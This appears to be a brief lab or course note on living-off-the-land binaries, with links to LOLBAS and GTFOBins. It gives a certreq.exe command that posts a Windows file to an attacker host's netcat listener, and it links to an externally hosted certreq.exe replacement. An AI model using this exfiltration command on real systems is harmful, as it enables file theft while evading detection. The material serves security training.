Living off the Land binaries can be used to perform functions such as:

- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses
- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

### Certreq.exe
We need to listen on a port on our attack host for incoming traffic using Netcat and then execute certreq.exe to upload a file.
```
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```
Don't forget to fire up a netcat listener on attacker machine.

If you get an error when running `certreq.exe`, the version you are using may not contain the `-Post` parameter. You can download an updated version [here](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) and try again.

